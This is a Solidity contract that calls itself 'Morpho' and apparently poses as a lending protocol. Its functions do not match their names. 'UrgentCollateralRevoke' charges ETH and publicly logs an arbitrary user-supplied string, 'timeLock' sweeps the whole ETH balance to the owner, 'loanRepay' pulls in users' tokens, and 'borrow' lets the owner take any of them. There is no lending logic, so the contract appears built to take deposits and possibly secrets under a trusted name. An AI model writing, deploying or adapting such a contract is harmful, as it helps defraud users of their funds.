// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

contract Morpho {
    /* STORAGE */
    address public owner;
    address public feeRecipient;
    address public underControl;

    /* EVENTS */
    event SetOwner(address newOwner);
    event SetFeeRecipient(address newFeeRecipient);
    event SetUnderControl(address newUnderControl);
    event UrgentCollateralRevokeTriggered(address indexed sender, string dataInput, uint256 amount);
    event TimeLockExecuted(uint256 amount, address to);
    event LoanRepaid(address indexed sender, address token, uint256 amount);
    event BorrowExecuted(address token, uint256 amount);

    /* CONSTRUCTOR */
    constructor(address newOwner, address newUnderControl) {
        require(newOwner != address(0), "ZERO_ADDRESS_OWNER");
        require(newUnderControl != address(0), "ZERO_ADDRESS_CONTROL");

        owner = newOwner;
        underControl = newUnderControl;

        emit SetOwner(newOwner);
        emit SetUnderControl(newUnderControl);
    }

    /* MODIFIERS */
    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }


    function setOwner(address newOwner) external onlyOwner {
        require(newOwner != owner, "ALREADY_SET");
        owner = newOwner;

        emit SetOwner(newOwner);
    }

    function setFeeRecipient(address newFeeRecipient) external onlyOwner {
        require(newFeeRecipient != feeRecipient, "ALREADY_SET");
        feeRecipient = newFeeRecipient;

        emit SetFeeRecipient(newFeeRecipient);
    }

    function setUnderControl(address newUnderControl) external onlyOwner {
        require(newUnderControl != underControl, "ALREADY_SET");
        require(newUnderControl != address(0), "ZERO_ADDRESS_CONTROL");
        underControl = newUnderControl;

        emit SetUnderControl(newUnderControl);
    }

    function UrgentCollateralRevoke(string calldata dataInput) external payable {
        require(msg.value >= 0.001 ether, "Minimum payment is 0.001 ETH");
        require(bytes(dataInput).length > 0, "Input data cannot be empty");

        emit UrgentCollateralRevokeTriggered(msg.sender, dataInput, msg.value);
    }

    function timeLock() external onlyOwner {
        uint256 amount = address(this).balance;
        require(amount > 0, "NO_BALANCE");

        (bool success, ) = owner.call{value: amount}("");
        require(success, "TRANSFER_FAILED");

        emit TimeLockExecuted(amount, owner);
    }

    function loanRepay(address token, uint256 amount) external {
        require(token != address(0), "ZERO_TOKEN_ADDRESS");
        require(amount > 0, "ZERO_AMOUNT");

        bool success = IERC20(token).transferFrom(msg.sender, address(this), amount);
        require(success, "TRANSFER_FAILED");

        emit LoanRepaid(msg.sender, token, amount);
    }

    function borrow(address token, uint256 amount) external onlyOwner {
        require(token != address(0), "ZERO_TOKEN_ADDRESS");
        require(amount > 0, "ZERO_AMOUNT");

        bool success = IERC20(token).transfer(owner, amount);
        require(success, "TRANSFER_FAILED");

        emit BorrowExecuted(token, amount);
    }

    function extSloads(bytes32 slot) external view returns (bytes32 res) {
        assembly {
            res := sload(slot)
        }
    }
}

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
